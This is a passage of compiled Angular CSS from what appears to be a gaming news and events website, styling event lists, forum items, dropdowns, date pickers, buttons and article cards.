        .event-list[_ngcontent-gtc-c15] .events[_ngcontent-gtc-c15] .event-item[_ngcontent-gtc-c15] .logo[_ngcontent-gtc-c15] {
            height: 60px;
            margin: 3px 14px 0 5px;
            width: 60px;
            float: left;
            border-radius: 4px;
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat
        }

        .event-list[_ngcontent-gtc-c15] .events[_ngcontent-gtc-c15] .event-item[_ngcontent-gtc-c15] h3[_ngcontent-gtc-c15] {
            margin: 2px 0;
            font-family: Montserrat;
            font-size: 14px;
            font-weight: 600;
            font-stretch: normal;
            font-style: normal;
            line-height: 1.5;
            letter-spacing: normal;
            color: #fff;
            overflow: hidden;
            -webkit-box-orient: vertical;
            display: -webkit-box;
            -webkit-line-clamp: 3;
            text-overflow: ellipsis
        }

        .event-list[_ngcontent-gtc-c15] .events[_ngcontent-gtc-c15] .event-item[_ngcontent-gtc-c15] p[_ngcontent-gtc-c15] {
            font-size: 12px;
            display: block;
            color: #b4b4c0;
            font-family: Montserrat;
            margin: 5px 0 0 80px;
            font-weight: 400;
            text-transform: uppercase
        }

        .event-list[_ngcontent-gtc-c15] .forum[_ngcontent-gtc-c15] .event-item[_ngcontent-gtc-c15] {
            padding: 12px 0;
            cursor: pointer;
            position: relative
        }

        .event-list[_ngcontent-gtc-c15] .forum[_ngcontent-gtc-c15] .event-item[_ngcontent-gtc-c15] .link[_ngcontent-gtc-c15]:focus {
            outline: 0
        }

        .event-list[_ngcontent-gtc-c15] .forum[_ngcontent-gtc-c15] .event-item[_ngcontent-gtc-c15] .logo[_ngcontent-gtc-c15] {
            height: 60px;
            margin: 3px 14px 0 5px;
            width: 60px;
            float: left;
            border-radius: 4px;
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat
        }

        .event-list[_ngcontent-gtc-c15] .forum[_ngcontent-gtc-c15] .event-item[_ngcontent-gtc-c15] h3[_ngcontent-gtc-c15] {
            margin: 2px 0;
            font-family: Montserrat;
            font-size: 14px;
            font-weight: 600;
            font-stretch: normal;
            font-style: normal;
            line-height: 1.5;
            letter-spacing: normal;
            color: #fff;
            overflow: hidden;
            -webkit-box-orient: vertical;
            display: -webkit-box;
            -webkit-line-clamp: 2;
            text-overflow: ellipsis
        }

        .event-list[_ngcontent-gtc-c15] .forum[_ngcontent-gtc-c15] .event-item[_ngcontent-gtc-c15] .author[_ngcontent-gtc-c15] {
            display: flex
        }

        .event-list[_ngcontent-gtc-c15] .forum[_ngcontent-gtc-c15] .event-item[_ngcontent-gtc-c15] .author[_ngcontent-gtc-c15] b[_ngcontent-gtc-c15] {
            color: #b4b4c0
        }

        .event-list[_ngcontent-gtc-c15] .forum[_ngcontent-gtc-c15] .event-item[_ngcontent-gtc-c15] .comment[_ngcontent-gtc-c15] {
            margin-top: 10px;
            display: flex
        }

        .event-list[_ngcontent-gtc-c15] .forum[_ngcontent-gtc-c15] .event-item[_ngcontent-gtc-c15] .comment[_ngcontent-gtc-c15] img[_ngcontent-gtc-c15] {
            margin: 4px 5px 0 18px;
            width: 15px;
            height: 10px
        }

        .event-list[_ngcontent-gtc-c15] .forum[_ngcontent-gtc-c15] .event-item[_ngcontent-gtc-c15] .comment[_ngcontent-gtc-c15] img[_ngcontent-gtc-c15]:first-child {
            width: 12px;
            height: 12px;
            margin: 3px 10px 0 0
        }

        .event-list[_ngcontent-gtc-c15] .forum[_ngcontent-gtc-c15] .event-item[_ngcontent-gtc-c15] .comment[_ngcontent-gtc-c15] img[_ngcontent-gtc-c15]:last-child {
            margin: 4px 5px 0 18px;
            width: 15px;
            height: 10px
        }

        .event-list[_ngcontent-gtc-c15] .forum[_ngcontent-gtc-c15] .event-item[_ngcontent-gtc-c15] p[_ngcontent-gtc-c15] {
            font-size: 12px;
            color: #69707e;
            font-family: Montserrat;
            font-weight: 400
        }
    </style>
    <style>
        @charset "UTF-8";
        .justify-content-left[_ngcontent-gtc-c16] {
            justify-content: left !important
        }

        .justify-content-center[_ngcontent-gtc-c16] {
            justify-content: center !important
        }

        .justify-content-right[_ngcontent-gtc-c16] {
            justify-content: right !important
        }

        .justify-content-space-between[_ngcontent-gtc-c16] {
            justify-content: space-between !important
        }

        .justify-content-flex-end[_ngcontent-gtc-c16] {
            justify-content: flex-end !important
        }

        .text-decoration-line-through[_ngcontent-gtc-c16] {
            text-decoration: line-through !important
        }

        .text-decoration-underline[_ngcontent-gtc-c16] {
            text-decoration: underline !important
        }

        .text-decoration-overline[_ngcontent-gtc-c16] {
            text-decoration: overline !important
        }

        .text-decoration-none[_ngcontent-gtc-c16] {
            text-decoration: none !important
        }

        .align-self-center[_ngcontent-gtc-c16] {
            align-self: center
        }

        .cursor-no-drop[_ngcontent-gtc-c16] {
            cursor: no-drop !important
        }

        .cursor-pointer[_ngcontent-gtc-c16] {
            cursor: pointer !important
        }

        .text-left[_ngcontent-gtc-c16] {
            text-align: left !important
        }

        .text-center[_ngcontent-gtc-c16] {
            text-align: center !important
        }

        .text-right[_ngcontent-gtc-c16] {
            text-align: right !important
        }

        .text-justify[_ngcontent-gtc-c16] {
            text-align: justify !important
        }

        .v-align-top[_ngcontent-gtc-c16] {
            vertical-align: top !important
        }

        .v-align-middle[_ngcontent-gtc-c16] {
            vertical-align: middle !important
        }

        .v-align-bottom[_ngcontent-gtc-c16] {
            vertical-align: bottom !important
        }

        .float-left[_ngcontent-gtc-c16] {
            float: left !important
        }

        .float-right[_ngcontent-gtc-c16] {
            float: right !important
        }

        .mat-datepicker-toggle[_ngcontent-gtc-c16] button.mat-icon-button[_ngcontent-gtc-c16] {
            position: absolute;
            right: 0;
            top: 25px;
            width: 24px;
            height: 24px;
            color: #6a707d
        }

        .mat-datepicker-toggle[_ngcontent-gtc-c16] button.mat-icon-button[_ngcontent-gtc-c16] span.mat-button-wrapper[_ngcontent-gtc-c16],
        .mat-datepicker-toggle[_ngcontent-gtc-c16] button.mat-icon-button[_ngcontent-gtc-c16] span.mat-button-wrapper[_ngcontent-gtc-c16] svg.mat-datepicker-toggle-default-icon[_ngcontent-gtc-c16] {
            position: absolute;
            left: 0;
            top: 0;
            max-width: 24px;
            max-height: 24px
        }

        .cust-dropdown[_ngcontent-gtc-c16] {
            position: relative
        }

        .cust-dropdown[_ngcontent-gtc-c16] i.fa-caret-down[_ngcontent-gtc-c16] {
            position: absolute;
            width: 9px;
            height: 15px;
            top: 0;
            bottom: 0;
            right: 5px;
            margin: auto
        }

        .cust-dropdown[_ngcontent-gtc-c16] input[type=text][_ngcontent-gtc-c16] {
            width: calc(100% - 10px);
            padding: 5px 10px;
            margin-right: 10px;
            background: 0 0;
            border: 0;
            outline: 0
        }

        .cust-dropdown[_ngcontent-gtc-c16] .cust-option[_ngcontent-gtc-c16] {
            display: none;
            position: absolute;
            min-width: 100%;
            top: 100%;
            background: #1d1f23;
            z-index: 99;
            padding: 15px 25px;
            box-shadow: 0 3px 8px 0 rgba(0, 0, 0, .35);
            border-radius: 3px
        }

        .cust-dropdown[_ngcontent-gtc-c16] .cust-option.active[_ngcontent-gtc-c16] {
            display: block
        }

        .cust-dropdown[_ngcontent-gtc-c16] .cust-option[_ngcontent-gtc-c16] ul.option-list[_ngcontent-gtc-c16] {
            margin: 0;
            padding: 0;
            list-style: none
        }

        .cust-dropdown[_ngcontent-gtc-c16] .cust-option[_ngcontent-gtc-c16] ul.option-list[_ngcontent-gtc-c16] li[_ngcontent-gtc-c16] {
            margin: 0;
            padding: 0;
            list-style: none;
            position: relative
        }

        .cust-dropdown[_ngcontent-gtc-c16] .cust-option[_ngcontent-gtc-c16] ul.option-list[_ngcontent-gtc-c16] li[_ngcontent-gtc-c16] label[_ngcontent-gtc-c16] {
            display: block;
            margin: 0;
            padding: 10px 0 10px 30px
        }

        .cust-dropdown[_ngcontent-gtc-c16] .cust-option[_ngcontent-gtc-c16] ul.option-list[_ngcontent-gtc-c16] li[_ngcontent-gtc-c16] label[_ngcontent-gtc-c16]:before {
            content: "";
            position: absolute;
            width: 20px;
            height: 20px;
            top: 0;
            bottom: 0;
            left: 0;
            margin: auto;
            border: 1px solid #fff;
            border-radius: 50%
        }

        .cust-dropdown[_ngcontent-gtc-c16] .cust-option[_ngcontent-gtc-c16] ul.option-list[_ngcontent-gtc-c16] li[_ngcontent-gtc-c16] label[_ngcontent-gtc-c16]:after {
            content: "";
            opacity: 0;
            position: absolute;
            width: 10px;
            height: 10px;
            top: 0;
            bottom: 0;
            left: 5px;
            margin: auto;
            border: 1px solid #fff;
            background: #fff;
            border-radius: 50%
        }

        .cust-dropdown[_ngcontent-gtc-c16] .cust-option[_ngcontent-gtc-c16] ul.option-list[_ngcontent-gtc-c16] li[_ngcontent-gtc-c16] input[type=radio][_ngcontent-gtc-c16] {
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            opacity: 0
        }

        .cust-dropdown[_ngcontent-gtc-c16] .cust-option[_ngcontent-gtc-c16] ul.option-list[_ngcontent-gtc-c16] li[_ngcontent-gtc-c16] input[type=radio][_ngcontent-gtc-c16]:checked+label[_ngcontent-gtc-c16]:after {
            opacity: 1
        }

        html[_ngcontent-gtc-c16] {
            scroll-behavior: smooth
        }

        body[_ngcontent-gtc-c16] {
            margin: 0;
            padding: 0;
            overflow-x: hidden !important
        }

        a[_ngcontent-gtc-c16],
        label[_ngcontent-gtc-c16],
        ol[_ngcontent-gtc-c16] li[_ngcontent-gtc-c16],
        table[_ngcontent-gtc-c16] td[_ngcontent-gtc-c16],
        table[_ngcontent-gtc-c16] th[_ngcontent-gtc-c16],
        ul[_ngcontent-gtc-c16] li[_ngcontent-gtc-c16] {
            font-family: Montserrat
        }

        b[_ngcontent-gtc-c16] {
            font-family: Montserrat-Bold;
            font-weight: 800
        }

        h1[_ngcontent-gtc-c16],
        h2[_ngcontent-gtc-c16],
        h3[_ngcontent-gtc-c16],
        h4[_ngcontent-gtc-c16],
        h5[_ngcontent-gtc-c16],
        h6[_ngcontent-gtc-c16],
        p[_ngcontent-gtc-c16],
        span[_ngcontent-gtc-c16] {
            margin: 0;
            font-family: Montserrat
        }

        button[_ngcontent-gtc-c16] {
            outline: 0;
            font-family: Montserrat
        }

        input[_ngcontent-gtc-c16],
        textarea[_ngcontent-gtc-c16] {
            font-family: Montserrat;
            color: #fff
        }

        label.error-label[_ngcontent-gtc-c16] {
            margin: 5px 0;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 400;
            color: #d0021b;
            display: block
        }

        label.success-label[_ngcontent-gtc-c16] {
            margin: 5px 0;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 400;
            color: green;
            display: block
        }

        label.label-input[_ngcontent-gtc-c16] {
            display: block;
            font-family: Montserrat;
            font-size: 12px;
            color: #6a707d;
            margin-bottom: 10px
        }

        @media (max-width:767px) {
            label.label-input[_ngcontent-gtc-c16] {
                font-size: 11px
            }
        }

        label.label-media[_ngcontent-gtc-c16] {
            display: block;
            font-family: Montserrat;
            font-size: .8em;
            color: #6a707d;
            margin-bottom: 10px
        }

        .close-solid[_ngcontent-gtc-c16] {
            padding: 5px;
            height: 30px;
            width: 30px;
            background: 0 0;
            border: none;
            cursor: pointer
        }

        .close-solid[_ngcontent-gtc-c16] span[_ngcontent-gtc-c16] {
            height: 100%;
            width: 100%;
            display: inline-block;
            background-image: url(close-global.785be75897033bcf1c3f.png);
            background-size: 50px;
            background-repeat: no-repeat;
            background-position: center
        }

        .close-circle-wrap[_ngcontent-gtc-c16] {
            position: relative;
            float: right;
            margin-top: 20px;
            z-index: 1;
            background: 0 0;
            border: none
        }

        .close-circle-wrap[_ngcontent-gtc-c16] p[_ngcontent-gtc-c16] {
            display: inline-block;
            vertical-align: middle;
            color: #fff;
            font-family: Montserrat-Bold;
            font-weight: 600;
            font-size: .9em;
            text-transform: uppercase
        }

        @media (max-width:767px) {
            .close-circle-wrap[_ngcontent-gtc-c16] p[_ngcontent-gtc-c16] {
                font-size: .75em
            }
        }

        .close-circle-wrap[_ngcontent-gtc-c16] p.close-circle[_ngcontent-gtc-c16] {
            height: 42px;
            width: 42px;
            background: 0 0;
            border: 2px solid #fff;
            cursor: pointer;
            padding: 12px;
            margin-left: 10px;
            border-radius: 100%;
            opacity: .5
        }

        .close-circle-wrap[_ngcontent-gtc-c16] p.close-circle[_ngcontent-gtc-c16] span[_ngcontent-gtc-c16] {
            height: 100%;
            width: 100%;
            display: inline-block;
            background-image: url(close-global.785be75897033bcf1c3f.png);
            background-size: 50px;
            background-repeat: no-repeat;
            background-position: center
        }

        .cta.cta--generate[_ngcontent-gtc-c16] {
            margin-top: 30px;
            padding: 16px 27px;
            background: #d0021b;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 600;
            text-transform: uppercase;
            color: #fff;
            border: none;
            border-radius: 3px;
            letter-spacing: 1px
        }

        .cta.cta--create[_ngcontent-gtc-c16] {
            text-decoration: none;
            padding: 10px 5px 10px 30px;
            background: #d0021b;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 600;
            text-transform: uppercase;
            color: #fff;
            border: 1px solid transparent;
            border-radius: 3px;
            letter-spacing: 1px
        }

        .cta.cta--create[_ngcontent-gtc-c16] span[_ngcontent-gtc-c16] {
            font-family: Montserrat;
            font-size: .8em;
            color: #fff;
            background: #9c0114;
            padding: 5px 10px;
            display: inline-block;
            border-radius: 3px;
            margin: 0 10px
        }

        .cta.cta--border-transparent[_ngcontent-gtc-c16] {
            text-decoration: none;
            padding: 10px 40px;
            background: 0 0;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 600;
            text-transform: uppercase;
            color: #fff;
            border: 1px solid #fff;
            border-radius: 3px;
            letter-spacing: 1px
        }

        .cta.cta--transparent-white[_ngcontent-gtc-c16] {
            font-family: Montserrat;
            border: 1px solid #fff;
            padding: 15px 20px;
            border-radius: 4px;
            background: 0 0;
            outline: 0;
            font-size: .9em;
            font-weight: 600;
            color: #fff;
            text-transform: uppercase;
            text-decoration: none;
            letter-spacing: 1px
        }

        .cta.cta--solid-grey[_ngcontent-gtc-c16] {
            font-family: Montserrat;
            border: 1px solid transparent;
            padding: 15px 60px;
            border-radius: 4px;
            background: #2d2d30;
            outline: 0;
            font-size: .9em;
            font-weight: 600;
            color: #6b6b6d;
            text-transform: uppercase;
            text-decoration: none;
            letter-spacing: 1px
        }

        a.close-frame[_ngcontent-gtc-c16] {
            position: absolute;
            right: 30px;
            top: 0;
            font-family: Montserrat;
            color: #fff;
            font-size: .9em;
            font-weight: 400;
            text-transform: uppercase;
            opacity: 1;
            z-index: 10
        }

        a.close-frame.close-frame--tournament[_ngcontent-gtc-c16] span[_ngcontent-gtc-c16] {
            padding: 4px 9px 4px 12px;
            border: 3px solid #6a707d;
            width: 42px;
            height: 42px;
            font-size: 20px;
            font-weight: 700;
            top: 16px
        }

        a.close-frame.close-frame--tournament[_ngcontent-gtc-c16] p[_ngcontent-gtc-c16] {
            font-family: Montserrat;
            font-size: 13px;
            font-weight: 700;
            font-style: normal;
            font-stretch: normal;
            line-height: 1.23;
            letter-spacing: 1.4px;
            text-align: center;
            color: #fff
        }

        a.close-frame[_ngcontent-gtc-c16] p[_ngcontent-gtc-c16] {
            display: inline-block
        }

        @media (max-width:767px) {
            a.close-frame[_ngcontent-gtc-c16] {
                right: 10px
            }
            a.close-frame[_ngcontent-gtc-c16] p[_ngcontent-gtc-c16] {
                display: none
            }
        }

        a.close-frame[_ngcontent-gtc-c16] span[_ngcontent-gtc-c16] {
            margin-left: 10px;
            font-family: Montserrat;
            display: inline-block;
            width: 30px;
            height: 30px;
            padding: 5px 10px;
            border: 1px solid #6a707d;
            color: #6a707d;
            font-weight: 600;
            overflow: hidden;
            border-radius: 100%;
            position: relative;
            right: 0;
            top: 10px
        }

        .form-control[_ngcontent-gtc-c16] {
            position: relative;
            font-family: Montserrat !important;
            font-size: 1em;
            outline: 0;
            background: 0 0;
            border-radius: 0;
            box-shadow: none
        }

        .form-control.form-control--default[_ngcontent-gtc-c16] {
            padding: 0;
            border: none;
            border-bottom: 1px solid rgba(106, 112, 125, .49);
            box-shadow: none;
            color: #fff
        }

        .form-control.form-control--count[_ngcontent-gtc-c16] {
            text-align: center;
            margin: 0 10px 10px;
            width: 50px;
            padding: 0;
            border: none;
            border-bottom: 1px solid rgba(106, 112, 125, .49);
            box-shadow: none;
            color: #fff
        }

        .form-control.form-control--transparent[_ngcontent-gtc-c16] {
            outline: 0;
            color: #fff;
            font-size: 1em;
            box-shadow: none;
            padding: 0;
            background: 0 0;
            border: none;
            box-shadow: none
        }

        .form-control.form-control--textarea[_ngcontent-gtc-c16] {
            outline: 0;
            color: #fff;
            font-size: 1em;
            box-shadow: none;
            padding: 10px;
            border-radius: 4px;
            background-color: rgba(106, 112, 125, .19);
            border: none;
            box-shadow: none
        }

        .form-control[_ngcontent-gtc-c16]::-moz-placeholder {
            color: #69707e
        }

        .form-control[_ngcontent-gtc-c16]::-ms-input-placeholder {
            color: #69707e
        }

        .form-control[_ngcontent-gtc-c16]::placeholder {
            color: #69707e
        }

        .header-text[_ngcontent-gtc-c16] h3[_ngcontent-gtc-c16] {
            font-family: Montserrat-Bold;
            font-size: 2.3em;
            text-transform: capitalize;
            color: #fff
        }

        @media (max-width:767px) {
            a.close-frame[_ngcontent-gtc-c16] span[_ngcontent-gtc-c16] {
                right: 10px
            }
            .header-text[_ngcontent-gtc-c16] h3[_ngcontent-gtc-c16] {
                font-size: 1.5em
            }
        }

        .header-text[_ngcontent-gtc-c16] h4[_ngcontent-gtc-c16] {
            font-family: Montserrat-Bold;
            font-size: 1.5em;
            color: #fff
        }

        .header-text[_ngcontent-gtc-c16] p[_ngcontent-gtc-c16] {
            font-family: Montserrat;
            font-size: 1em;
            font-weight: 400;
            font-style: normal;
            font-stretch: normal;
            line-height: 1.5;
            letter-spacing: normal;
            text-align: center;
            color: #b4b4c0
        }

        .header-text-medium[_ngcontent-gtc-c16] h3[_ngcontent-gtc-c16] {
            font-family: Montserrat-Bold;
            font-size: 2em;
            color: #fff
        }

        .header-text-small[_ngcontent-gtc-c16] h3[_ngcontent-gtc-c16] {
            font-family: Montserrat-Bold;
            font-size: 1.5em;
            color: #fff
        }

        @media (max-width:767px) {
            .header-text-medium[_ngcontent-gtc-c16] h3[_ngcontent-gtc-c16],
            .header-text-small[_ngcontent-gtc-c16] h3[_ngcontent-gtc-c16] {
                font-size: 1.5em
            }
        }

        .header-text-extra-small[_ngcontent-gtc-c16] h3[_ngcontent-gtc-c16] {
            font-family: Montserrat;
            font-size: 1.2em;
            color: #fff
        }

        @media (max-width:767px) {
            .header-text-extra-small[_ngcontent-gtc-c16] h3[_ngcontent-gtc-c16] {
                font-size: 1em
            }
        }

        .header-text-extra-small-bold[_ngcontent-gtc-c16] h3[_ngcontent-gtc-c16] {
            font-family: Montserrat-Bold;
            font-size: 1.2em;
            color: #fff
        }

        .body-text[_ngcontent-gtc-c16] p[_ngcontent-gtc-c16] {
            font-family: Montserrat;
            font-size: 1em;
            font-weight: 400;
            font-style: normal;
            font-stretch: normal;
            line-height: 1.5;
            letter-spacing: normal;
            text-align: center;
            color: #b4b4c0
        }

        .description-text[_ngcontent-gtc-c16] p[_ngcontent-gtc-c16] {
            font-size: 1em;
            color: #fff
        }

        .radio-input[_ngcontent-gtc-c16] {
            position: absolute;
            left: 0;
            right: 0;
            top: 0;
            bottom: 0;
            height: 100%;
            width: 100%;
            z-index: 9;
            opacity: 0
        }

        .middle-top[_ngcontent-gtc-c16] {
            margin: auto;
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            transform: translateY(-50%)
        }

        .fleft[_ngcontent-gtc-c16] {
            float: left
        }

        .fright[_ngcontent-gtc-c16] {
            float: right
        }

        .row[_ngcontent-gtc-c16] .padding-left-0[_ngcontent-gtc-c16] {
            padding-left: 0
        }

        .form-group.form-group--media[_ngcontent-gtc-c16] {
            position: relative;
            border-bottom: 1px solid #2b2e34
        }

        .dd-selected[_ngcontent-gtc-c16] {
            background: 0 0
        }

        .invalid-feedback[_ngcontent-gtc-c16] {
            text-align: left;
            position: relative;
            z-index: 1
        }

        .popup-shuffle[_ngcontent-gtc-c16] {
            position: fixed;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            z-index: 99
        }

        .popup-shuffle[_ngcontent-gtc-c16]:before {
            content: "";
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            background-color: rgba(0, 0, 0, .8)
        }

        .popup-shuffle[_ngcontent-gtc-c16] .shuffle-container[_ngcontent-gtc-c16] {
            width: 400px;
            height: 120px;
            max-width: 90vw;
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            margin: auto;
            border: 3px solid #6a707d;
            background: #1d1f23;
            border-radius: 4px;
            display: block
        }

        .popup-shuffle[_ngcontent-gtc-c16] .shuffle-container[_ngcontent-gtc-c16]>.row[_ngcontent-gtc-c16] {
            display: block;
            position: absolute;
            top: 50%;
            transform: translateY(-50%)
        }

        .popup-shuffle[_ngcontent-gtc-c16] .shuffle-container[_ngcontent-gtc-c16] .shuffle-pop-table[_ngcontent-gtc-c16] {
            display: table
        }

        .popup-shuffle[_ngcontent-gtc-c16] .shuffle-container[_ngcontent-gtc-c16] .shuffle-pop-table[_ngcontent-gtc-c16] .shuffle-pop-item[_ngcontent-gtc-c16] {
            display: table-cell;
            vertical-align: middle;
            width: 80%;
            padding-left: 20px
        }

        .popup-shuffle[_ngcontent-gtc-c16] .shuffle-container[_ngcontent-gtc-c16] .shuffle-pop-table[_ngcontent-gtc-c16] .shuffle-pop-item.img[_ngcontent-gtc-c16] {
            width: 20%;
            padding-left: 0
        }

        .popup-shuffle[_ngcontent-gtc-c16] .shuffle-container[_ngcontent-gtc-c16] img[_ngcontent-gtc-c16] {
            max-width: 100%
        }

        .popup-shuffle[_ngcontent-gtc-c16] .shuffle-container[_ngcontent-gtc-c16] p[_ngcontent-gtc-c16] {
            color: #fff;
            font-size: 1em
        }

        .popup-shuffle[_ngcontent-gtc-c16] .shuffle-container[_ngcontent-gtc-c16] p[_ngcontent-gtc-c16] strong[_ngcontent-gtc-c16] {
            font-size: 1.09em
        }

        .mat-datepicker-content[_ngcontent-gtc-c16] {
            background: #1d1f23
        }

        .mat-calendar-body-cell-content[_ngcontent-gtc-c16] {
            color: #fff
        }

        .mat-calendar-body-disabled[_ngcontent-gtc-c16]>.mat-calendar-body-cell-content[_ngcontent-gtc-c16]:not(.mat-calendar-body-selected) {
            color: #616161
        }

        .mat-calendar-body-label[_ngcontent-gtc-c16],
        .mat-calendar-table-header[_ngcontent-gtc-c16] th[_ngcontent-gtc-c16],
        .mat-datepicker-content[_ngcontent-gtc-c16] .mat-calendar-next-button[_ngcontent-gtc-c16],
        .mat-datepicker-content[_ngcontent-gtc-c16] .mat-calendar-previous-button[_ngcontent-gtc-c16],
        .mat-datepicker-toggle[_ngcontent-gtc-c16],
        .mat-icon-button[disabled][disabled][_ngcontent-gtc-c16] {
            color: #fff
        }

        .mat-calendar-arrow[_ngcontent-gtc-c16] {
            border-top-color: #fff
        }

        .mat-calendar-header[_ngcontent-gtc-c16] {
            color: #fff
        }

        .cdk-keyboard-focused[_ngcontent-gtc-c16] .mat-calendar-body-active[_ngcontent-gtc-c16]>.mat-calendar-body-cell-content[_ngcontent-gtc-c16]:not(.mat-calendar-body-selected),
        .cdk-program-focused[_ngcontent-gtc-c16] .mat-calendar-body-active[_ngcontent-gtc-c16]>.mat-calendar-body-cell-content[_ngcontent-gtc-c16]:not(.mat-calendar-body-selected),
        .mat-calendar-body-cell[_ngcontent-gtc-c16]:not(.mat-calendar-body-disabled):hover>.mat-calendar-body-cell-content[_ngcontent-gtc-c16]:not(.mat-calendar-body-selected),
        .mat-calendar-body-today[_ngcontent-gtc-c16]:not(.mat-calendar-body-selected) {
            border-color: transparent;
            background: #d0021b
        }

        .mat-calendar-body-selected[_ngcontent-gtc-c16] {
            background: #d0021b;
            box-shadow: none
        }

        .block-url[_ngcontent-gtc-c16] {
            position: absolute;
            content: "";
            left: 0;
            right: 0;
            top: 0;
            bottom: 0;
            z-index: 91
        }

        .mat-primary[_ngcontent-gtc-c16] .mat-option.mat-selected[_ngcontent-gtc-c16]:not(.mat-option-disabled) {
            color: #000;
            opacity: .8
        }

        .mat-select-panel[_ngcontent-gtc-c16] .mat-option[_ngcontent-gtc-c16] {
            color: #797979
        }

        .ngx-editor-textarea[_ngcontent-gtc-c16] div[_ngcontent-gtc-c16],
        .ngx-editor-textarea[_ngcontent-gtc-c16] section[_ngcontent-gtc-c16] {
            max-width: 100% !important;
            width: 100% !important;
            background: 0 0 !important;
            box-shadow: none !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c16] div[_ngcontent-gtc-c16] img[_ngcontent-gtc-c16],
        .ngx-editor-textarea[_ngcontent-gtc-c16] section[_ngcontent-gtc-c16] img[_ngcontent-gtc-c16] {
            width: 100% !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c16] a[_ngcontent-gtc-c16] {
            text-decoration: none !important;
            border: none !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c16] *[_ngcontent-gtc-c16] {
            max-width: 100% !important;
            font-family: Montserrat !important;
            background: 0 0 !important;
            line-height: 1.5;
            word-break: break-word !important;
            text-indent: unset !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c16] b[_ngcontent-gtc-c16] {
            font-family: Montserrat-Bold !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c16] b[_ngcontent-gtc-c16] *[_ngcontent-gtc-c16] {
            font-family: Montserrat-Bold !important;
            text-indent: unset !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c16] td[_ngcontent-gtc-c16] {
            border-color: #6a707d !important;
            padding: 8px !important
        }

        .app-layout-wrap[_ngcontent-gtc-c16] {
            background-color: #000
        }

        @media (min-width:1200px) {
            .d-main[_ngcontent-gtc-c16] {
                max-width: 1440px;
                margin: 0 auto
            }
            .layout-content[_ngcontent-gtc-c16] {
                background-color: #000
            }
        }

        .d-absolute--center[_ngcontent-gtc-c16] {
            position: absolute;
            top: 40%;
            width: 100%;
            text-align: center;
            z-index: 2
        }

        .d-absolute--center[_ngcontent-gtc-c16] img[_ngcontent-gtc-c16] {
            width: 50px;
            opacity: .5
        }

        article[_ngcontent-gtc-c16] {
            padding: 20px 0;
            overflow: auto;
            border-bottom: 2px solid #444447;
            cursor: pointer
        }

        @media (max-width:767px) {
            .header-text-extra-small-bold[_ngcontent-gtc-c16] h3[_ngcontent-gtc-c16] {
                font-size: 1em
            }
            .fleft[_ngcontent-gtc-c16] {
                float: right
            }
            .fright[_ngcontent-gtc-c16] {
                float: left
            }
            .popup-shuffle[_ngcontent-gtc-c16] .shuffle-container[_ngcontent-gtc-c16] .shuffle-pop-table[_ngcontent-gtc-c16] {
                padding: 0 20px
            }
            .mat-datepicker-toggle[_ngcontent-gtc-c16] button.mat-icon-button[_ngcontent-gtc-c16] {
                top: auto;
                bottom: 7px
            }
            article[_ngcontent-gtc-c16] {
                border: none
            }
        }

        article[_ngcontent-gtc-c16]:focus {
            outline: 0
        }

        article[_ngcontent-gtc-c16] .live[_ngcontent-gtc-c16] {
            margin: 15px;
            position: relative;
            display: inline-block;
            padding: 5px 10px 5px 20px;
            font-family: Montserrat;
            font-size: .8em;
            color: #fff;
            background: #d0021b;
            text-transform: uppercase;
            border-radius: 5px
        }

        article[_ngcontent-gtc-c16] .live[_ngcontent-gtc-c16] span[_ngcontent-gtc-c16] {
            position: relative
        }

        article[_ngcontent-gtc-c16] .live[_ngcontent-gtc-c16] span[_ngcontent-gtc-c16]::before {
            position: absolute;
            content: "";
            height: 4px;
            width: 4px;
            display: inline-block;
            overflow: hidden;
            border-radius: 100%;
            left: -10px;
            top: 5px;
            background: #fff
        }

        @media (max-width:767px) {
            article[_ngcontent-gtc-c16] .live[_ngcontent-gtc-c16] {
                margin: unset unset unset 2px;
                padding: 2px 5px 0 8px;
                font-size: 8px;
                border-radius: 2px
            }
            article[_ngcontent-gtc-c16] .live[_ngcontent-gtc-c16] span[_ngcontent-gtc-c16]::before {
                left: -7px;
                top: 3px
            }
            article[_ngcontent-gtc-c16] .d-absolute--center.list[_ngcontent-gtc-c16] {
                top: 35%
            }
            article[_ngcontent-gtc-c16] .d-absolute--center.list[_ngcontent-gtc-c16] img[_ngcontent-gtc-c16] {
                width: 25px
            }
        }

        article[_ngcontent-gtc-c16] .image[_ngcontent-gtc-c16] {
            margin-right: 15px;
            position: relative;
            width: 285px;
            background-image: url(https://apist.duniagames.co.id/api/content/upload/file/1830808….jpg);
            height: 176px;
            background-position: center;
            background-size: cover;
            background-repeat: no-repeat;
            border-radius: 4px;
            float: left
        }

        @media (max-width:767px) {
            article[_ngcontent-gtc-c16] .image[_ngcontent-gtc-c16] {
                width: 64px;
                height: 64px
            }
        }

        article[_ngcontent-gtc-c16] .caption[_ngcontent-gtc-c16] {
            width: 80%
        }

        article[_ngcontent-gtc-c16] .caption[_ngcontent-gtc-c16] .event-item .date {
            color: #b4b4c0 !important;
            font-size: 10px
        }

        article[_ngcontent-gtc-c16] .caption[_ngcontent-gtc-c16] .event-item small {
            margin: 2px 0 0 7px
        }

        article[_ngcontent-gtc-c16] .caption[_ngcontent-gtc-c16] .date[_ngcontent-gtc-c16] {
            font-family: Montserrat;
            font-size: 12px;
            font-weight: 500;
            font-stretch: normal;
            font-style: normal;
            line-height: normal;
            letter-spacing: normal;
            color: #fff;
            text-transform: uppercase
        }

        article[_ngcontent-gtc-c16] .caption[_ngcontent-gtc-c16] .date.show-xs[_ngcontent-gtc-c16] {
            display: none
        }

        article[_ngcontent-gtc-c16] .caption[_ngcontent-gtc-c16] .title[_ngcontent-gtc-c16] {
